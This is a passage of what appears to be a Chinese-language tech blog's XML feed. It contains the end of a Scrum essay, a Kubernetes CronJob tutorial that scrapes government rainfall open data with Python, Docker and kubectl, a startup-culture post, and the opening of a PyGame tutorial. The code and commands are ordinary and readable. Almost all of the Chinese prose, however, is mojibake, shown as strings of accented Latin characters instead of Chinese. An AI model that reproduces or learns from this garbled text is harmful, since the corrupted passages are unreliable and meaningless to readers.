çµæŸå¾Œç•¶åˆæ‰¿è«¾çš„ä»»å‹™éƒ½æ˜¯æœ‰å¯äº¤ä»˜çš„ç”¢å‡º

Scrum æ˜¯ä¸€é¢ç…§å¦–é¡ é€é Scrum å¯ä»¥è®“ç•¶åˆä¸æ¸…æ¥šçš„ä½¿ç”¨è€…éœ€æ±‚ã€ç„¡æ ¹æ“šçš„é ä¼°å·¥ä½œæ™‚é–“å’Œç„¡é™åˆ¶éœ€æ±‚çš„äº‚è±¡å¯ä»¥è¢«æ”¤åœ¨é™½å…‰ä¸‹æª¢è¦–å’Œè¨è«–ï¼Œæ‰æœ‰æ©Ÿæœƒé€é Scrum process ä¾†ç®¡ç†å’Œæ”¹å–„

é€šå¸¸çµ†è…³çŸ³æ˜¯ä½ ä¸èƒ½èªªåå­—çš„é‚£å€‹äºº åœ¨æ¨è¡Œ Scrum æ™‚ï¼Œå…¬å¸é«˜å±¤å’Œæ–‡åŒ–çš„æ”¯æŒä¹Ÿæ˜¯ååˆ†é‡è¦ï¼Œå› ç‚ºé€šå¸¸å…¬å¸æ¨å±• Scrum æˆ–æ˜¯æ•æ·é–‹ç™¼æœƒå¤±æ•—ï¼Œé€šå¸¸çµ†è…³çŸ³æ˜¯ä½ ä¸èƒ½èªªåå­—çš„é‚£å€‹äºº

ä¿æŒä½ çš„æ­¥ä¼ æ’å®šå¥½æ™‚é–“å¾Œå°±å›ºå®šä¸‹ä¾†ï¼Œè®“åœ˜éšŠæˆå“¡å¯ä»¥èª¿æ•´å¥½è‡ªå·±çš„ç¯€å¥ä¸¦æœ‰æ›´å¤šäº‹æƒ…å¯ä»¥å°ˆæ³¨åœ¨ä»»å‹™å®Œæˆä¸Šè€Œéå†—é•·æœƒè­°æˆ–æ˜¯é›œäº‹ä¸Š

è¦æ¸¬é‡æ‰èƒ½é€²æ­¥ æ¯æ¬¡ Sprint çµæŸä¸€å®šè¦æœ‰æª¢è¨ä¸¦é€éæ•¸æ“šåœ–è¡¨ç­‰æª¢è¦–å¯ä»¥æ”¹å–„çš„éƒ¨åˆ†ï¼ŒæŒçºŒå„ªåŒ–æ•´å€‹æµç¨‹

è»Ÿé«”é–‹ç™¼æµç¨‹æ²’æœ‰éŠ€å½ˆ è¬›äº†é‚£éº¼å¤šï¼Œäº‹å¯¦ä¸Š Scrum ä¹Ÿä¸¦éè¬èƒ½ï¼Œç¢°ä¸Šå¸¸å¸¸æœƒæœ‰è‡¨æ™‚æ€§ä»»å‹™æˆ–æ˜¯ operation issue ç‰¹æ€§ä»»å‹™çš„åœ˜éšŠï¼Œæˆ–è¨±å¯ä»¥è€ƒæ…®ä½¿ç”¨ Kanbanï¼Œæ›´ç”šæ–¼ Scrumã€‚å¦å¤–ï¼Œåƒæ˜¯æŠ€è¡“ç ”ç©¶å–®ä½ï¼Œä½¿ç”¨ Scrum ä¹Ÿæœªå¿…æ˜¯ä¸€ç¨®å¥½é¸æ“‡


ç¸½çµä»¥ä¸Šé€éä¸€å€‹ Scrum Master è¦–è§’å»æ¢è¨ Scrum Master åœ¨ Scrum Team ä¸­æ‰€æ‰®æ¼”çš„è§’è‰²å’Œå¯èƒ½é‡åˆ°çš„æŒ‘æˆ°å’Œæ©Ÿé‡ã€‚Scrum Master æ˜¯ä¸€å€‹å¿…é ˆå°æ–¼ç”¢å“é–‹ç™¼æµç¨‹ä»¥åŠæºé€šèƒ½åŠ›æœ‰ä¸€å®šæŒæ¡ä¸¦å…·å‚™ä¸€å®šçš„æŠ€è¡“å¯¦åŠ›çš„è§’è‰²ã€‚èªªçœŸçš„ï¼ŒçœŸæ­£è¦ç•¶çš„å¥½ Scrum Masterï¼Œä¸å®¹æ˜“ã€‚äº‹å¯¦ä¸Šï¼ŒScrum çœŸæ­£ç›®æ¨™åœ¨æ–¼å»ºç«‹ä¸€å€‹è‡ªæˆ‘ç®¡ç†çš„çµ„ç¹”ï¼Œè®“ Process è€Œéäººä¾†ç®¡ç†ã€‚ç•¶ Scrum çœŸæ­£æˆåŠŸçš„æ™‚å€™ï¼Œå°±æ˜¯ Scrum Master å¯ä»¥é€€ä¼‘çš„æ™‚å€™äº†ã€‚
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
åƒè€ƒæ–‡ä»¶
ç‡ƒå°½å›¾ ï¼ˆBurn up and Burn down Chartï¼‰â€”ä»‹ç»
Clear Acceptance Criteria and Why Theyâ€™re Important
ç•¶ä¸€å€‹ Scrum Master æ˜¯ä¸€å€‹æ€æ¨£çš„é«”é©—ï¼Ÿ

ï¼ˆimage via eohcoastalï¼‰
]]></content>
      <tags>
        <tag>scrum</tag>
        <tag>scrum master</tag>
        <tag>product owner</tag>
        <tag>dev tame</tag>
        <tag>è»Ÿé«”å·¥ç¨‹å¸«</tag>
        <tag>è»Ÿé«”å·¥ç¨‹</tag>
        <tag>software engineering</tag>
        <tag>æ•æ·é–‹ç™¼</tag>
        <tag>agile</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•ä½¿ç”¨ K8S è‡ªå‹•åŒ–å®šæœŸ CronJob æŠ“ç¶²è·¯å…¬é–‹è³‡æ–™</title>
    <url>/2019/06/29/how-to-build-kubernetes-k8s-cronjob-crawler/</url>
    <content><![CDATA[
å‰è¨€æœ‰ä½¿ç”¨ Linux çš„è®€è€…å°±çŸ¥é“ï¼Œè‹¥æ˜¯æœ‰å®šæœŸéœ€è¦åŸ·è¡Œçš„ç¨‹å¼å°±å¯ä»¥ Crontab æŠŠå¯«å¥½çš„ script é€éå®šæœŸçš„ scheduler å®šæœŸåŸ·è¡Œç¯€çœäººåŠ›ã€‚ä¸€èˆ¬å¸¸è¦‹çš„ä½¿ç”¨ç¯„ç–‡å°±æ˜¯å®šæœŸæ›´æ–°æª”æ¡ˆè³‡æ–™æˆ–æ˜¯ç¶²è·¯çˆ¬èŸ²ç­‰ã€‚ä»Šå¤©æˆ‘å€‘å‰‡æ˜¯è¦ä»‹ç´¹ï¼Œå¦‚ä½•ä½¿ç”¨ Kubernetesï¼ˆk8sï¼‰ çš„ CronJob ä¾†è‡ªå‹•åŒ–æŠ“å–ç¶²è·¯å…¬é–‹è³‡æ–™ï¼ˆé€™é‚Šæˆ‘å€‘ä½¿ç”¨æ”¿åºœå…¬é–‹è³‡æ–™çš„é›¨é‡è³‡æ–™ JSON æª”æ¡ˆï¼‰ï¼Œæˆ‘å€‘æƒ³è¦çš„å®šæœŸåŸ·è¡Œç¨‹å¼çš„æ•ˆæœã€‚å¥½çš„ï¼Œé‚£å°±è®“æˆ‘å€‘é–‹å§‹å§ï¼
ç’°å¢ƒè¨­å®šè‹¥æ˜¯å°æ–¼ Kubernetesï¼ˆk8sï¼‰æ¯”è¼ƒä¸ç†Ÿæ‚‰çš„è®€è€…å¯ä»¥æƒ³æˆæ˜¯ Kubernetesï¼ˆk8sï¼‰æ˜¯ä¸€å€‹å¤§å‹çš„ container èª¿åº¦å’Œç®¡ç†å·¥å…·ï¼Œé€é config è¨­å®šå¯ä»¥ç®¡ç†ä½ çš„ dockerize å¾Œçš„ applicationã€‚
åœ¨é€™ç¯‡æ–‡ç« ä¸­æˆ‘å€‘æœƒä½¿ç”¨ minikube é€™å€‹ local é–‹ç™¼æ¸¬è©¦ç”¨çš„ Kubenetesï¼ˆk8sï¼‰cluster ç•¶ä½œæ¸¬è©¦ demo ä½¿ç”¨ã€‚è‹¥ä½ çš„é›»è…¦é‚„æ²’æœ‰å®‰è£ Kubernetesï¼ˆk8sï¼‰çš„ç›¸é—œç’°å¢ƒçš„è©±ï¼Œå¯ä»¥å…ˆåƒè€ƒå®˜æ–¹ç¶²ç«™çš„æ•™å­¸å’Œæˆ‘å€‘ä¹‹å‰çš„æ•™å­¸æ–‡ç« ã€‚
é€™é‚Šæˆ‘å€‘ä½¿ç”¨ macOS ç•¶ä½œç¯„ä¾‹ï¼Œéœ€è¦å®‰è£çš„æœ‰ virtual boxã€kubernetes-cli å’Œ minikube ä¸¦ç™»å…¥å¥½ä½ çš„ docker hub å¸³æˆ¶ï¼š
ç¢ºèªä¸€ä¸‹è‹¥æ˜¯ä½ çš„ minikube å·²ç¶“ start æˆåŠŸï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—æŒ‡ä»¤ç¢ºèªæ˜¯å¦æ­£å¸¸å•Ÿå‹•ï¼š
$ kubectl cluster-info

å¦å¤–ä¹Ÿå¯ä»¥å®‰è£ kubectx é€™å€‹å¥½ç”¨å°å·¥å…·ï¼Œæ–¹ä¾¿ä½ åˆ‡æ›åˆ°ä¸åŒ clusterï¼Œé€™é‚Šæˆ‘å€‘è¦åˆ‡æ›åˆ° minikubeã€‚
æ’°å¯« CronJob ç¨‹å¼å’Œ Dockerfileå› ç‚ºç¯„ä¾‹ç‚ºæ±‚ç°¡å–®ï¼Œé€™é‚Šæˆ‘å€‘ä½¿ç”¨ Python æ’°å¯«ä¸€å€‹ç°¡å–®æ¯åˆ†é˜å®šæœŸæŠ“å–æ”¿åºœå…¬é–‹è³‡æ–™çš„ python ç¨‹å¼ï¼Œä¸»è¦åŠŸèƒ½ç‚ºï¼š

æŠ“å–ç¶²è·¯å…¬é–‹è³‡æ–™
æ ¹æ“šæ™‚é–“å„²å­˜æˆ {datatime}.json æª”æ¡ˆåˆ° &#x2F;data è³‡æ–™å¤¾ä¸‹

ç¯„ä¾‹ç¨‹å¼ app.pyï¼š 
import jsonfrom datetime import datetimeimport globimport requestsdef main():    url = &#x27;https://opendata.cwb.gov.tw/fileapi/v1/opendataapi/O-A0002-001?Authorization=rdec-key-123-45678-011121314&amp;format=JSON&#x27;    resp = requests.get(url)    data = resp.json()    with open(&#x27;/data/&#123;&#125;.json&#x27;.format(datetime.utcnow()), &#x27;w&#x27;) as f:        json.dump(data, f)if __name__ == &#x27;__main__&#x27;:    main()

åƒè€ƒ Dockerfileï¼š
FROM python:3.7-alpineADD . /codeWORKDIR /codeRUN pip install -r requirements.txtCMD [&quot;python&quot;, &quot;app.py&quot;]

è‹¥æ˜¯å®Œæˆå¾Œå¯ä»¥é€éå°‡æˆ‘å€‘çš„ç¨‹å¼æ‰“åŒ…æˆ docker image ç„¶å¾Œä¸Šå‚³åˆ° docker hub ä¸Šï¼Œè®“ä¹‹å¾Œçš„ k8s cronjob å¯ä»¥æŠ“ä¸‹ä¾†ï¼ˆç•¶ç„¶è‹¥æ˜¯ç§äººå°ˆæ¡ˆæˆ–æ˜¯å…¬å¸å°ˆæ¡ˆå¯ä»¥è€ƒæ…®ä½¿ç”¨ google cloud registry ä¾† host ä½ çš„ imageï¼‰ã€‚
æ‰“åŒ… image æª”æ¡ˆï¼ˆxxxx ç‚ºä½ çš„ docker hub idï¼Œk8s-cronjob-pvc-example ç‚º image åç¨±ï¼Œv1 ç‚º tag åç¨±ï¼‰ï¼š
docker build -t xxxx/k8s-cronjob-pvc-example:v1

è‹¥æ˜¯å®Œæˆå¾Œå¯ä»¥ä½¿ç”¨ $ docker image list è§€çœ‹æ˜¯å¦æœ‰æ­£å¸¸é¡¯ç¤º
æ¥è‘—å°±è¦æ¨é€åˆ° docker hub ä¸Šé¢ï¼š
$ docker push xxxx/k8s-cronjob-pvc-example:v1

æˆåŠŸå¾Œæ‡‰è©²å°±å¯ä»¥åœ¨ä½ è‡ªå·±çš„ docker hub ä¸Šé¢çœ‹åˆ°ä¸Šå‚³çš„ image æª”æ¡ˆï¼
æ’°å¯« k8s CronJob config æª”æ¡ˆä¸Šå‚³ image åˆ° docker hub å¾Œï¼Œæˆ‘å€‘è¦é–‹å§‹å°‡æˆ‘å€‘çš„ç¨‹å¼ deploy åˆ° minikube é€™å€‹ local k8s cluster ä¸Šé¢ï¼
é¦–å…ˆæˆ‘å€‘å…ˆå®šç¾© schedule æ ¼å¼ç‚ºï¼š*/1 * * * * ï¼ˆæ¯åˆ†é˜åŸ·è¡Œä¸€æ¬¡ï¼‰
cron ä¸»è¦æ ¼å¼ * * * * * å°±æ˜¯ç”±å·¦åˆ°å³åˆ†åˆ¥ç‚ºï¼š

åˆ†é˜
å°æ™‚
æ¯æœˆä¸­ç¬¬å¹¾å¤©
æœˆ
æ˜ŸæœŸå¹¾

è‹¥æ˜¯ä½ å°æ–¼ cronjob æ ¼å¼æ¯”è¼ƒä¸ç†Ÿæ‚‰ï¼Œå¯ä»¥åƒè€ƒé€™å€‹ç¶²ç«™ï¼Œä»–å¯ä»¥é€éè¼¸å…¥ä½ çš„è¨­å®šå€¼å‘Šè¨´ç›®å‰æ ¼å¼çš„æ•ˆæœï¼Œååˆ†æ–¹ä¾¿ï¼
ä»¥ä¸‹æ˜¯åƒè€ƒçš„ cronjob.yaml æª”æ¡ˆï¼š

æˆ‘å€‘è¨­å®š apiVersion ç‰ˆæœ¬å’Œ k8s config é¡å‹ kind ç‚º CronJob
å¾ kdchang&#x2F;k8s-cronjob-pvc-example:v1 æŠ“ä¸‹ä¾†æˆ‘å€‘çš„ç¨‹å¼
é€é &#x2F;bin&#x2F;sh æŒ‡ä»¤åˆ—å°å‡º ls &#x2F;data å¯«å…¥æª”æ¡ˆåˆ—è¡¨
å€¼å¾—æ³¨æ„çš„æ˜¯ç”±æ–¼ k8s è³‡æºåˆ©ç”¨çš„è¨­è¨ˆï¼Œæ¯æ¬¡ pod é‡å•Ÿä¸ä¸€å®šæœƒæ˜¯åœ¨åŒä¸€å€‹ node ä¸Šéƒ¨å±¬ï¼Œå¦å¤–éš¨è‘— pod çš„é‡å•Ÿåœ¨ local çš„æª”æ¡ˆç”Ÿå‘½é€±æœŸä¹Ÿæœƒéš¨ä¹‹æ¶ˆå¤±ã€‚é€™å°æ–¼å®šæœŸç”¢ç”Ÿçš„  pod å®Œæˆå¾Œå°±å›æ”¶çš„ CronJob ä¾†èªªæœƒæ˜¯ä¸€å€‹å•é¡Œï¼šå› ç‚ºæˆ‘å€‘æƒ³è¦æˆ‘å€‘å®šæœŸæŠ“ä¸‹ä¾†çš„ç¶²è·¯è³‡æ–™å¯ä»¥æŒçºŒå­˜åœ¨ã€‚é—œæ–¼é€™å€‹å•é¡Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨å¯«å…¥è³‡æ–™åº«æˆ–æ˜¯å®£å‘Š k8s persistent volume ä¸¦æ›è¼‰æª”æ¡ˆè·¯å¾‘åˆ° CronJob ä¸­ä¾†è§£æ±ºã€‚

ä»¥ä¸‹æˆ‘å€‘å®£å‘Š hostPath volumes ä¸¦æŠŠ volume mount åˆ° &#x2F;data ä¸‹é¢ï¼ˆhostPath ä½ å¯ä»¥æƒ³æˆè‹¥æ˜¯ pod é‡å•Ÿï¼Œæœƒå»æ‰¾åˆ°ä¸Šæ¬¡çš„ pod çš„æª”æ¡ˆè·¯å¾‘å’Œä¿ç•™çš„æª”æ¡ˆï¼Œç•¶å¯¦å‹™ä¸Šæœƒé€ æˆ pod æ²’è¾¦æ³•æœ‰æ•ˆ deploy åˆ°é©åˆçš„ node ä¸Šï¼Œæ­¤è™•å› ç‚ºä½¿ç”¨ minikube æ¸¬è©¦æ‰€ä»¥æ²’ä½¿ç”¨ GCPã€AWSç­‰ persistent volume å’Œå¤–æ›æª”æ¡ˆç³»çµ±ï¼‰ã€‚
apiVersion: batch/v1beta1kind: CronJobmetadata:  name: k8s-cronjob-pvc-examplespec:  schedule: &quot;*/1 * * * *&quot;  jobTemplate:    spec:      template:        spec:          containers:          - name: k8s-cronjob-pvc-example            image: kdchang/k8s-cronjob-pvc-example:v1            args:            - /bin/sh            - -c            - ls /data            - date; echo Hello from the Kubernetes cluster            volumeMounts:            - mountPath: /data              name: crawl-data          restartPolicy: OnFailure          volumes:          - name: crawl-data            hostPath:              # directory location on host              path: /data              # this field is optional              type: Directory

æ¥è‘—åŸ·è¡Œæˆ‘å€‘çš„ cronjob.yaml
$ kubectl create -f cronjob.yamlcronjob.batch/k8s-cronjob-pvc-example created

æ­¤æ™‚ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤æ‡‰è©²å°±æœƒçœ‹åˆ° cronjob é–‹å§‹åŸ·è¡Œ
$ kubectl get cronjobNAME                      SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGEk8s-cronjob-pvc-example   */1 * * * *   False     0        &lt;none&gt;          11s

ä¸€åˆ†é˜å¾Œçœ‹åˆ° cronjob pod æˆåŠŸé–‹å§‹åŸ·è¡Œï¼
$ kubectl get podNAME                                       READY   STATUS      RESTARTS   AGEk8s-cronjob-pvc-example-1561892400-cbpc4   0/1     Completed   0          75sk8s-cronjob-pvc-example-1561892460-t9ckq   0/1     Completed   0          15s

è§€çœ‹ log
$ kubectl logs -f k8s-cronjob-pvc-example-1561892400-cbpc42019-06-29 10:27:57.140583.json2019-06-29 10:27:57.492762.json2019-06-29 10:27:57.737316.json2019-06-29 10:27:58.996981.json2019-06-29 10:27:59.125029.json2019-06-29 10:27:59.140703.json2019-06-29 10:28:12.885361.json2019-06-29 10:28:12.942726.json2019-06-29 10:28:15.883667.json2019-06-29 10:28:40.844267.json2019-06-29 10:28:43.823896.json2019-06-29 10:28:44.787840.json2019-06-29 10:28:47.097306.json2019-06-29 10:28:48.122653.json2019-06-29 10:29:02.764501.json2019-06-29 10:29:21.785981.json2019-06-29 10:29:29.779006.json2019-06-29 10:29:35.822945.json2019-06-29 10:30:10.770817.json2019-06-29 10:30:53.822591.json2019-06-29 10:31:09.812561.json

è‹¥ä½ è¦ç§»é™¤çš„è©±å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æŒ‡ä»¤ï¼š
$ kubectl delete cronjob k8s-cronjob-pvc-examplecronjob.batch &quot;k8s-cronjob-pvc-example&quot; deleted

ç¸½çµä»¥ä¸Šç°¡å–®ä»‹ç´¹äº†å¦‚ä½•ä½¿ç”¨ K8S è‡ªå‹•åŒ–å®šæœŸ CronJob æŠ“ç¶²è·¯å…¬é–‹è³‡æ–™ã€‚æœ‰è¨±å¤šé–‹ç™¼è€…åœ¨å¾è£¸æ©Ÿ bare metal server è½‰æ›åˆ° Kubenetesï¼ˆk8s) çš„éç¨‹ä¸­å¸¸å¸¸æœƒè¦ºå¾— deubg ä¸å¤ªç¿’æ…£ï¼Œä¸»è¦åŸå› å°±æ˜¯åŸæœ¬å¯ä»¥éš¨ä¾¿ ssh é€²å»ä¸»æ©Ÿå’ŒæŠ“å–æœ€æ–°çš„è³‡æ–™ä¸¦é‡å•Ÿæ©Ÿå™¨çš„ç°¡å–®ç²—æš´æ–¹å¼è®Šå¾—éº»ç…©ï¼Œä½†è‹¥æ˜¯èƒ½å…‹æœé€™ä¸€é»çš„è©±ï¼Œå°±èƒ½äº«å— dockerize çš„å¯æ”œæ€§å’Œ k8s çš„ç°¡å–®æ“´å±•å’Œéƒ¨å±¬ç‰¹æ€§ï¼Œæ›´åŠ å°ˆæ³¨åœ¨æ¥­å‹™é‚è¼¯ä¸Šã€‚æˆ‘å€‘ä¸‹å›è¦‹å›‰ï¼Œæ°æ’²ï¼
åƒè€ƒæ–‡ä»¶
Running Automated Tasks with a CronJob
Kubernetes, Docker, and Cron

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>k8s</tag>
        <tag>cronjob</tag>
        <tag>kubernetes</tag>
        <tag>crontab</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦‚ä½•æ‰“é€ æ›´å¥½çš„ç§‘æŠ€æ–°å‰µ (Startup) å·¥ä½œç’°å¢ƒå’Œçµ„ç¹”æ–‡åŒ–ï¼Ÿ</title>
    <url>/2016/03/19/how-to-build-a-great-startup-culture/</url>
    <content><![CDATA[æœ€è¿‘å‰›å¥½åœ¨çŸ¥ä¹ä¸Šçœ‹åˆ°ä¸€ç¯‡çŸ½è°·æ–°å‰µå…¬å¸æ–‡åŒ–å’Œå·¥ä½œç’°å¢ƒçš„æ–‡ç«  (å…§å®¹ä¸»è¦é‚„æ˜¯ä»¥ç¶²è·¯æˆ–ç§‘æŠ€æ–°å‰µå…¬å¸ç‚ºä¸»)ã€‚é€™äº›å…¬å¸é›–ç„¶æ¥­å‹™å…§å®¹å¤§ä¸ç›¸åŒä½†é‚„æ˜¯æœ‰ä¸€äº›å…±é€šæ€§ã€‚æ ¹æ“šè‡ªå·±çš„ç¶“é©—åšä¸€ä¸‹ç¿»è­¯å’Œè£œå……ï¼ŒæœŸå¾…æœªä¾†å°ç£ä¹Ÿèƒ½æœ‰æ›´å¤šä¸–ç•Œä¸€æµçš„ç§‘æŠ€æ–°å‰µå…¬å¸ï¼Œæä¾›äººæ‰æ›´å¥½çš„èˆå°å’Œå·¥ä½œç’°å¢ƒï¼Œå¤§å®¶ä¸€èµ·åŠ æ²¹å•¦ï¼
ç¬¬ 0 æ­¥ï¼šæ‰¾åˆ°å°çš„äººä¸Šè»Š (ç¢ºä¿æ¯ä½åŠ å…¥æˆå“¡éƒ½èƒ½ç†è§£ä¸¦èªåŒå…¬å¸åƒ¹å€¼è§€å’Œé¡˜æ™¯ã€‚æ‰“é€ å„ªè‰¯çš„çµ„ç¹”æ–‡åŒ–ä¸¦ä¸å®¹æ˜“ï¼Œä½†å´©è§£å¯èƒ½åªæ˜¯ä¸€å¤•ä¹‹é–“ã€‚æœ€åˆ Airbnb æ‰¾ç¬¬ä¸€è™Ÿå“¡å·¥å°±èŠ±äº†ç´„åŠå¹´çš„æ™‚é–“ï¼)
åƒè€ƒæ–‡ä»¶ï¼šAirbnbå‰µè¾¦äººBrian Cheskyè«‡ä¼æ¥­æ–‡åŒ–

é–‹æ”¾å¼è¾¦å…¬å®¤ï¼ˆä½†ä¿æœ‰ç§äººéœ€è¦å®‰éœå°ˆæ³¨çš„ç©ºé–“ï¼‰ï¼Œç›´æ¥æºé€šï¼Œå°‘é–‹æœƒã€‚ä»£ç¢¼å‹æ–¼é›„è¾¯ (Code wins arguments.)
å…è²»é£Ÿç‰©ï¼Œæä¾›å·¥ä½œé¤é»ï¼Œä¹Ÿå¯ä»¥èªªæ•…æ„å»¶é•·å·¥ä½œæ™‚é–“ :P
ä½¿ç”¨è˜‹æœé›»è…¦ (Mac) æˆ– Linuxï¼Œ ä»¥åŠä½¿ç”¨ Linux çš„é›²ç«¯ä¼ºæœå™¨ (Cloud Server)
æ“æŠ±é–‹æºè»Ÿé«” (Open Source)ï¼Œåˆ©ç”¨å„ç¨®å¯ç”¨å·¥å…·ï¼Œæ³¨æ„åŠ›é›†ä¸­åœ¨æ ¸å¿ƒç”¢å“
å¿«é€Ÿè¿­ä»£ (Iterate)ï¼ŒA &#x2F; B Testingï¼Œæ•¸æ“šé©…å‹•æ€è€ƒ (Data Driven Thinking)
æ³¨é‡ä½¿ç”¨è€…é«”é©— (User Experience)ï¼Œä½¿ç”¨è€…åˆ©ç›Šå¤§æ–¼ç²åˆ©è€ƒæ…®
ç°¡ç´„è¨­è¨ˆï¼Œæ³¨é‡ MVP (æœ€å°å¯è¡Œ) çš„ç”¢å“ï¼Œæ•æ·é–‹ç™¼
å·¥ç¨‹å¸«æ–‡åŒ–ï¼Œä¸æƒœä»£åƒ¹æ‰¾åˆ°æœ€åˆé©çš„äººæ‰ï¼Œå¸¸èˆ‰è¾¦å…§éƒ¨ Hack Dayã€‚æŠ€è¡“åˆ†äº«é¢¨æ°£æ¿ƒåšï¼Œç†±æ–¼å­¸ç¿’æ–°æŠ€è¡“

äº‹å¯¦ä¸Šï¼Œä»¥ä¸Šå¹¾é»ç§‘æŠ€æ–°å‰µ (Startup) çš„å¸¸è¦‹æ–‡åŒ–å’Œå·¥ä½œç’°å¢ƒæœªå¿…åˆé©æ–¼æ¯å€‹çµ„ç¹”ä¸­ã€‚èƒ½æ‰¾åˆ°åˆé©çš„å¤¥ä¼´åŠ å…¥åœ˜éšŠï¼Œä¸€èµ·æ‰“é€ é©åˆçš„æ–‡åŒ–å’Œåƒ¹å€¼è§€æ‰æ˜¯é—œéµã€‚
åƒè€ƒæ–‡ä»¶ï¼š

[ç¿»è­¯] æ˜¯ä»€éº¼é€ å°±äº†å¥½çš„è»Ÿé«”å·¥ç¨‹æ–‡åŒ–ï¼Ÿ(ä¸Š)
[ç¿»è­¯] æ˜¯ä»€éº¼é€ å°±äº†å¥½çš„è»Ÿé«”å·¥ç¨‹æ–‡åŒ–ï¼Ÿ(ä¸‹)

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Startup</tag>
        <tag>å‰µæ–°å‰µæ¥­</tag>
        <tag>å‰µæ¥­</tag>
        <tag>æ–°å‰µå…¬å¸</tag>
        <tag>Code wins arguments</tag>
        <tag>Hack Day</tag>
        <tag>Linux, Mac</tag>
        <tag>Open Source</tag>
        <tag>User Experience</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨ Python å’Œ PyGame éŠæˆ²è£½ä½œå…¥é–€æ•™å­¸</title>
    <url>/2019/10/19/how-to-build-up-game-with-pygame-tutorial/</url>
    <content><![CDATA[
å‰è¨€éš¨è‘—å¤©æ°£è¶Šä¾†è¶Šå†·ï¼Œå¾ˆå¤šäººå»ç´æ‚¶èšŠå­ç‚ºä½•ä¸æ¸›åå¢ã€‚èº«ç‚ºä¸€å€‹å·¥ç¨‹å¸«è‹¥æ²’è¾¦æ³•æˆåŠŸåœ¨ç¾å¯¦ç¤¾æœƒå’ŒèšŠå­å¥½å¥½ç›¸è™•ï¼Œåªå¥½åšæ‰“èšŠå­éŠæˆ²èª¿åŠ‘èº«å¿ƒï¼ˆå’¦ï¼‰ã€‚æœ¬æ–‡å°‡é€éä¸€å€‹æ‰“èšŠå­éŠæˆ²ï¼Œå¸¶é ˜è®€è€…å­¸ç¿’å¦‚ä½•ä½¿ç”¨ Python çš„ PyGame æ¨¡çµ„è£½ä½œä¸€å€‹ç°¡å–®çš„æ‰“èšŠå­éŠæˆ²ï¼Œåœ¨å­¸ç¿’éŠæˆ²é–‹ç™¼çš„åŸºæœ¬è§€å¿µçš„åŒæ™‚ï¼Œä¹Ÿè®“æˆ‘å€‘åœ¨è™›æ“¬ç¤¾æœƒä¸­å¯ä»¥å½Œè£œç¾å¯¦ç¤¾æœƒä¸­çš„éºæ†¾ï¼ˆå–‚ï¼‰ã€‚å¥½å•¦ï¼Œå°±è®“æˆ‘å€‘é–‹å§‹ PyGame éŠæˆ²é–‹ç™¼ä¹‹æ—…å§ï¼
PyGame åˆé«”é©—PyGame æ˜¯ä¸€ç¨® Python ç”¨ä¾†è£½ä½œéŠæˆ²çš„æ¨¡çµ„ï¼Œå®ƒèƒ½è®“é–‹ç™¼è€…å¯ä»¥ç”¨æ›´ç°¡å–®çš„æ–¹å¼åŠ å…¥æ–‡å­—ã€åœ–æ¡ˆã€è²éŸ³ç­‰å…ƒç´ ä¸¦é€²è¡Œäº‹ä»¶è™•ç†ä¾†é–‹ç™¼éŠæˆ²ã€‚æˆ‘å€‘å¯ä»¥çœ‹åˆ° PyGame å®˜æ–¹ç¶²ç«™ä¸Šæœ‰è¨±å¤šæœ‰è¶£çš„ç¶²å‹è£½ä½œçš„æœ‰è¶£éŠæˆ²ã€‚
é¦–å…ˆï¼Œæˆ‘å€‘å…ˆä¾†é€²è¡Œç’°å¢ƒè¨­å®šï¼Œå…ˆç¢ºä¿ä½ çš„ä½œæ¥­ç³»çµ±æœ‰å®‰è£ Python3ï¼Œæˆ‘å€‘é€™é‚Šä½¿ç”¨çš„æ˜¯ MacOS ä½œæ¥­ç³»çµ±ã€‚ç„¶å¾Œå®‰è£æˆ‘å€‘çš„ pygame æ¨¡çµ„ã€‚
$ pip install pygame

åœ¨é–‹å§‹ PyGame Hello World ä¹‹å‰æˆ‘å€‘å…ˆä¾†èªè­˜ PyGame å¹¾å¤§æ ¸å¿ƒå…ƒç´ ï¼š

pygame.Surfaceï¼šSurface è³‡æ–™å‹åˆ¥ï¼Œä»£è¡¨ä¸€å€‹çŸ©å½¢çš„å½±åƒï¼Œç”¨ä¾†ç¹ªè£½åœ¨è¢å¹•ä¸Š
pygame.Rectï¼šRect è³‡æ–™å‹åˆ¥ï¼Œç”¨ä¾†å®šä½çŸ©å½¢ç©ºé–“çš„ä½ç½®å’Œå¯ä»¥ç”¨ä¾†åµæ¸¬ç‰©ä»¶æ˜¯å¦ç¢°æ’çš„
pygame.eventï¼šäº‹ä»¶æ¨¡çµ„ï¼Œç”¨ä¾†è™•ç†ä½¿ç”¨è€…è§¸ç™¼äº‹ä»¶ï¼ŒåŒ…å«è‡ªå®šç¾©äº‹ä»¶
